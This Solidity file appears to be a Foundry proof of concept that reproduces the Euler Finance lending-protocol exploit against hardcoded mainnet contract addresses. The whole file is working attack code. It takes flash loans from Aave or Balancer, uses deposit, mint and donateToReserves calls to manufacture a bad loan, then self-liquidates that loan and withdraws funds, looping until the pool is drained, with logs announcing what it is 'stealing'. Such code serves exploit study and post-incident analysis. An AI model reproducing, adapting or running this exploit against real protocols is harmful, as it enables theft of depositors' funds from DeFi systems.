pragma solidity ^0.8.0;

import "../src/flashloan/FlashLoan.sol";
import "../src/reentrancy/Reentrancy.sol";
import "../src/tokens/Tokens.sol";

import "forge-std/interfaces/IERC20.sol";
import "forge-std/console2.sol";

// Euler Markets on Ethereum
// Source: https://docs.euler.finance/euler-protocol/addresses
library EulerProtocol {

    EToken public constant eUSDC = EToken(0xEb91861f8A4e1C12333F42DCE8fB0Ecdc28dA716);
    DToken public constant dUSDC = DToken(0x84721A3dB22EB852233AEAE74f9bC8477F8bcc42);

    EToken public constant eWBTC = EToken(0x0275b156cD77c5ed82D44bCc5f9E93eECff20138);
    DToken public constant dWBTC = DToken(0x36c4A49F624342225bA45fcfc2e1A4BcBCDcE557);

    EToken public constant eWETH = EToken(0x1b808F49ADD4b8C6b5117d9681cF7312Fcf0dC1D);
    DToken public constant dWETH = DToken(0x62e28f054efc24b26A794F5C1249B6349454352C);

    EToken public constant estETH = EToken(0x570a7e6E75C8043bd75B574D47988Aa305873818);
    DToken public constant dstETH = DToken(0x8f222fC08bD508571FcE098cAB5Bb4095346a561);

    EToken public constant eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken public constant dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);

    EToken public constant ewstETH = EToken(0xbd1bd5C956684f7EB79DA40f582cbE1373A1D593);
    DToken public constant dwstETH = DToken(0x436548baAb5Ec4D79F669D1b9506D67e98927aF7);

    ILiquidation public constant liquidation = ILiquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address public constant euler = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

}

enum TargetTokens {
    USDC,
    WBTC,
    WETH,
    stETH,
    DAI,
    wstETH,
    USDT
}

contract EulerHack is FlashLoan, Tokens {

    bool executeOperation;

    Violator violator;

    uint256 x;
    uint256 flashAmount;
    uint256 mintAmount;
    uint256 donateAmount;
    uint256 maxWithdraw;
    IERC20 token;
    EToken eToken;
    DToken dToken;

    function initiateAttack(TargetTokens targetToken) external {

        FlashLoanProviders provider;

        // USDC
        if (targetToken == TargetTokens.USDC) {
            x = 70_000_000;
            token = EthereumTokens.USDC;
            eToken = EulerProtocol.eUSDC;
            dToken = EulerProtocol.dUSDC;
            provider = FlashLoanProviders.AAVEV2;
        }

        // WBTC
        else if (targetToken == TargetTokens.WBTC) {
            x = 1_000; 
            token = EthereumTokens.WBTC;
            eToken = EulerProtocol.eWBTC;
            dToken = EulerProtocol.dWBTC;
            provider = FlashLoanProviders.AAVEV2;
        }

        // WETH
        else if (targetToken == TargetTokens.WETH) {
            x = 6_965; 
            token = EthereumTokens.WETH;
            eToken = EulerProtocol.eWETH;
            dToken = EulerProtocol.dWETH;
            provider = FlashLoanProviders.AAVEV2;
        }

        // stETH
        else if (targetToken == TargetTokens.stETH) {
            x = 6_965; 
            token = EthereumTokens.stETH;
            eToken = EulerProtocol.estETH;
            dToken = EulerProtocol.dstETH;
            provider = FlashLoanProviders.AAVEV2;
        }

        // DAI
        else if (targetToken == TargetTokens.DAI) {
            x = 10_000_000;
            token = EthereumTokens.DAI;
            eToken = EulerProtocol.eDAI;
            dToken = EulerProtocol.dDAI;
            provider = FlashLoanProviders.AAVEV2;
        }

        // wstETH
        else if (targetToken == TargetTokens.wstETH) {
            x = 33_000;
            token = EthereumTokens.wstETH;
            eToken = EulerProtocol.ewstETH;
            dToken = EulerProtocol.dwstETH;
            provider = FlashLoanProviders.BALANCER;
        }
 
        // Calculate attack parameters

        flashAmount = x * 3;
        mintAmount = x * 2 * 10;
        donateAmount = x * 10;
        maxWithdraw = (x * 3 * 9 * 2) / 10 - x;

        // Initiate the flashloan

        console.log("\n\n  [*] Attacking %s...", token.symbol());
        console.log("[*] Euler balance before exploit: %d %s", token.balanceOf(EulerProtocol.euler) / 10 ** token.decimals(), token.symbol());

        executeOperation = true;

        // Repeat until all of the pool is empty
        while (executeOperation) {
            console.log("[*] Borrowing %d %s", flashAmount, token.symbol());

            takeFlashLoan(provider, address(token), flashAmount * 10 ** token.decimals());
        }
        
        console.log("[*] Attacker balance after exploit: %d %s", token.balanceOf(address(this)) / 10 ** token.decimals(), token.symbol());
    }

    function _executeAttack() internal override {
        
        violator = new Violator();

        token.transfer(address(violator), flashAmount * 10**token.decimals());
        executeOperation = violator.violator(address(this), flashAmount, mintAmount, donateAmount, maxWithdraw, token, eToken, dToken);
    }

    function _completeAttack() internal override {
        // Finish attack
        // This function is called after the flash loan is repayed
    }
}

contract Violator {

   Liquidator liquidator;

    constructor() public {
        liquidator = new Liquidator();   
    }

    function violator(address exploit, uint256 initialBalance, uint256 mintAmount, uint256 donateAmount, uint256 maxWithdraw, IERC20 token, EToken eToken, DToken dToken) external returns (bool) {
        
        token.approve(EulerProtocol.euler, type(uint256).max);

        eToken.deposit(0, (2 * initialBalance / 3) * 10**token.decimals());
        eToken.mint(0, mintAmount * 10**token.decimals());
        dToken.repay(0, (initialBalance / 3) * 10**token.decimals());
        eToken.mint(0, mintAmount * 10**token.decimals());
        eToken.donateToReserves(0, donateAmount * 10**eToken.decimals());

        console.log("[*] Generated bad loan...");
        console.log("    Collateral: %d Debt: %d", eToken.balanceOf(address(this))/10**eToken.decimals(), dToken.balanceOf(address(this))/10**dToken.decimals());

        return liquidator.liquidate(exploit, initialBalance, mintAmount, donateAmount, maxWithdraw, address(this), token, eToken, dToken);
    }
}

contract Liquidator {

    function liquidate(address exploit, uint256 initialBalance, uint256 mintAmount, uint256 donateAmount, uint256 maxWithdraw, address violator, IERC20 token, EToken eToken, DToken dToken) external returns (bool) {
    
        ILiquidation.LiquidationOpportunity memory returnData =
            EulerProtocol.liquidation.checkLiquidation(address(this), violator, address(token), address(token));

        EulerProtocol.liquidation.liquidate(violator, address(token), address(token), returnData.repay, returnData.yield-1);

        console.log("[*] Liquidated bad loan...");
        console.log("    Collateral: %d Debt: %d Profit: %d", eToken.balanceOf(address(this))/10**eToken.decimals(), dToken.balanceOf(address(this))/10**dToken.decimals(), eToken.balanceOf(address(this))/10**eToken.decimals() - dToken.balanceOf(address(this))/10**dToken.decimals());

        bool repeat = false;
        if (maxWithdraw * 10 ** token.decimals() < token.balanceOf(EulerProtocol.euler)) {
            console.log("[*] Stealing %d %s from Euler pool", maxWithdraw - initialBalance, token.symbol());
            eToken.withdraw(0, maxWithdraw * 1e18);
            repeat = true;
            
        } else {
            console.log("[*] Stealing %d %s from Euler pool", token.balanceOf(EulerProtocol.euler) / 10**token.decimals() - initialBalance, token.symbol());
            eToken.withdraw(0, token.balanceOf(EulerProtocol.euler));
        }
        
        token.transfer(exploit, token.balanceOf(address(this)));

        return repeat;
    }
}

interface EToken {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
    function balanceOf(address) external returns (uint256);
    function decimals() external returns (uint256);
}

interface DToken {
    function repay(uint256 subAccountId, uint256 amount) external;
    function balanceOf(address) external returns (uint256);
    function decimals() external returns (uint256);
}

interface ILiquidation {
    struct LiquidationOpportunity {
        uint256 repay;
        uint256 yield;
        uint256 healthScore;
        uint256 baseDiscount;
        uint256 discount;
        uint256 conversionRate;
    }

    function liquidate(
        address violator,
        address underlying,
        address collateral,
        uint256 repay,
        uint256 maxWithdraw
    ) external;
    function checkLiquidation(
        address liquidator,
        address violator,
        address underlying,
        address collateral
    ) external returns (LiquidationOpportunity memory liqOpp);
}